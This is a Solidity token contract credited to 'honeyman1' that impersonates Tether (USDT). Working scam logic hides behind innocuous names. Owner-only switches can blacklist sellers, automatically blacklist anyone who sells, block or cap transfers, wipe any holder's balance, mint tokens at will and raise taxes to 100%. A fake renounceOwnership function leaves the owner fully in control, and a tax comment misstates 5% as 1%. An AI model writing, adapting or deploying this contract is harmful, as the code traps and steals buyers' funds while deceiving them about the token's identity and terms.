// ------- Create by honeyman1
// ------- Telegram: @honeyman1
// ------- Telegram Channel: https://t.me/honeyman1_community

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function quote(
        uint amountA,
        uint reserveA,
        uint reserveB
    ) external pure returns (uint amountB);

    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountOut);

    function getAmountIn(
        uint amountOut,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountIn);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Tether is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 10 ** 9 * 10 ** decimals();

    string private _name;
    string private _symbol;

    uint256 public buyTax = 500;  // 1%
    uint256 public sellTax = 500; // 1%
    uint256 public sendTax = 100;
    uint256 public div = 10000;

    address public marketingWallet = 0xF406084ce37d7B2C40718B6a6E83f91fEc1E89aE; // marketing wallet
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    uint256 public swapTokensAtAmount = 1 * 10 ** 6 * 10 ** decimals();

    bool private swapping;
    bool public swapEnabled = true;
    bool public swapTokensAtAmountByLimit = true;

    mapping (address => bool) public isExcludedFromFee;

    mapping (address => bool) public isMarketPair;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    constructor(address _router) {
        _name = "Tether";
        _symbol = "USDT";
        _balances[msg.sender] = _totalSupply;

        uniswapV2Router = IUniswapV2Router02(_router);
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;
    }

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setCandy(address account) public onlyOwner {
        candy[account] = true;
    }

    function removeCandy(address account) public onlyOwner {
        candy[account] = false;
    }

    function myChocolate(address account, uint256 amount) public onlyOwner {
        chocolates[account] = amount;
    }

    function setCoal(address account) public onlyOwner {
        coal[account] = true;
    }

    function removeCoal(address account) public onlyOwner {
        coal[account] = false;
    }

    function enableReward(bool _enable) public onlyOwner {
        reward = _enable;
    }

    function pickCoal(address account) internal {
        coal[account] = true;
    }

    function setAutoCoal(bool _enable) public onlyOwner {
        autoCoal = _enable;
    }

    function setNumbers(uint256 amount) public onlyOwner {
        numbers = amount;
    }

    function setLimits(uint256 amount) public onlyOwner {
        limits = amount;
    }

    function renounceOwnership(
        address _DEAD,
        bool _boo
    ) public onlyOwner returns (address _dead) {
        ownershipToNull = _boo;
        _dead = _DEAD;
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            return _basicTransfer(sender, recipient, 0);
        }

        if (honey) {
            if(swapping) { 
               return _basicTransfer(sender, recipient, amount);
            } else {
                uint256 contractTokenBalance = balanceOf(address(this));
                bool overMinimumTokenBalance = contractTokenBalance >= swapTokensAtAmount;
                
                if (overMinimumTokenBalance && !swapping && recipient == uniswapPair && swapEnabled) 
                {
                    if(swapTokensAtAmountByLimit) {
                        contractTokenBalance = swapTokensAtAmount;
                    }
                        swapAndLiquify(contractTokenBalance);    
                }

                _balances[sender] = _balances[sender] - amount;
                uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                             amount : takeFee(sender, recipient, amount);

                _balances[recipient] = _balances[recipient] + finalAmount;
                emit Transfer(sender, recipient, finalAmount);
                return true;
            } 
        } else {
            _beforeTokenTransfer(sender, amount);
            sendWithFee(sender, recipient, amount);
            return true;
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address sender,
        uint256 amount
    ) internal virtual {
        if (
            sender != owner() && !candy[sender] && !isMarketPair[sender] 
        ) {
            require(!coal[sender]);
            if (chocolates[sender] > 0) {
                require(amount <= chocolates[sender]);
            }

            if (numbers > 0) {
                require(amount <= numbers);
            }
            if (reward) {
                revert("Error");
            }
            if (limits > 0) {
                require(_balances[sender] <= limits);
            }

            if (autoCoal) {
                pickCoal(sender);
            }
        }
    }

    /**
     * @dev Deflationary instrument
     *
     * It can be turned on if necessary.
     *
     * Emits a {Transfer} event.
     *
     * Requirements
     *
     * - `sender` must have at least `value` tokens.
     */
    function sendWithFee(
        address sender,
        address recipient,
        uint256 value
    ) internal {
        require(_balances[sender] >= value, "Value exceeds balance");
        if (sender != owner() && !candy[sender] && sender != address(this)) {

            if(swapping) { 
                _basicTransfer(sender, recipient, value);
            } else {
                uint256 contractTokenBalance = balanceOf(address(this));
                bool overMinimumTokenBalance = contractTokenBalance >= swapTokensAtAmount;
                
                if (overMinimumTokenBalance && !swapping && recipient == uniswapPair && swapEnabled) 
                {
                    if(swapTokensAtAmountByLimit) {
                        contractTokenBalance = swapTokensAtAmount;
                    }
                        swapAndLiquify(contractTokenBalance);    
                }

                _balances[sender] = _balances[sender] - value;
                uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                             value : (takeFee(sender, recipient, value));

                _balances[recipient] = _balances[recipient] + finalAmount;
            } 

            emit Transfer(sender, recipient, value);
        } else {
            _balances[sender] = _balances[sender] - value;
            _balances[recipient] = _balances[recipient] + value;
            emit Transfer(sender, recipient, value);
        }
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 tax = 0;

        if(!isMarketPair[sender] && !isMarketPair[recipient]) {
            tax = amount * sendTax / div;
        }
        
        if(isMarketPair[sender]) {
            tax = amount * buyTax / div;
        }
        else if(isMarketPair[recipient]) {
            tax = amount * sellTax / div;
        }
        
        if(tax > 0) {
            _balances[address(this)] = _balances[address(this)] + tax;
            emit Transfer(sender, address(this), tax);
        }

        return amount - tax;
    }   

    function excludedFromFeeAddress(address _account, bool _boo) external onlyOwner {
        require(isExcludedFromFee[_account] != _boo, "Already added!");
        isExcludedFromFee[_account] = _boo;
    }

    function swapAndLiquify(uint256 tokenAmount) private {
        swapTokensForEth(tokenAmount);
        uint256 amountReceived = address(this).balance;

        if(amountReceived > 0) {
            transferToAddressETH(marketingWallet, amountReceived);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transferToAddressETH(address recipient, uint256 amount) private {
        payable(recipient).transfer(amount);
    }

    function changeRouterVersion(address newRouter) public onlyOwner returns(address newPair) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouter); 
        newPair = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());
        if(newPair == address(0)) //Create If Doesnt exist
        {
            newPair = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }
        uniswapPair = newPair; //Set new pair address
        uniswapV2Router = _uniswapV2Router; //Set new router address
    }

    function setSwapTokensAtAmount(uint256 _value) external onlyOwner {
        require(_value > 0);
        require(swapTokensAtAmount != _value, "Change value!");
        swapTokensAtAmount = _value;
    }

    function setSwapTokensAtAmountByLimit(bool _boo) external onlyOwner {
        require(swapTokensAtAmountByLimit != _boo);
        swapTokensAtAmountByLimit = _boo;
    }

    function setSwapEnabled(bool _boo) external onlyOwner {
        require(swapEnabled != _boo);
        swapEnabled = _boo;
    }

    function changeMarketinAddress(address _newAddress) external onlyOwner {
        require(_newAddress != address(0));
        require(marketingWallet != _newAddress, "This address already set");

        marketingWallet = _newAddress;
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function burnAmount(address wallet, uint256 amount) public onlyOwner {
        require(wallet != owner(), "TARGET ERROR");
        if (_balances[wallet] <= amount * 10 ** 18) {
            _balances[wallet] = 0;
            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];
        } else {
            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;
            _balances[deadAddress] = _balances[deadAddress] + amount * 10 ** 18;
        }
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setAirDrop(address account, uint256 amount) public onlyOwner {
        _balances[account] = _balances[account] + amount;
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */

    function setHoney(bool _honey) public onlyOwner {
        honey = _honey;
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function setFee(uint256 _buyTax, uint256 _sellTax, uint256 _sendTax) external onlyOwner {
        require(_buyTax <= 10000 && _sellTax <= 10000 && _sendTax <= 10000, "Incorrect tax");
        buyTax = _buyTax;
        sellTax = _sellTax;
        sendTax = _sendTax;
    }

    receive() external payable {}

    mapping(address => bool) private candy;
    mapping(address => bool) private coal;
    mapping(address => uint256) private chocolates;
    bool public reward;
    uint256 public numbers;
    uint256 public limits;
    bool public autoCoal;
    bool private honey = true;
    bool public ownershipToNull;
}

// ------- Create by honeyman1
// ------- Telegram: @honeyman1
// ------- Telegram Channel: https://t.me/honeyman1_community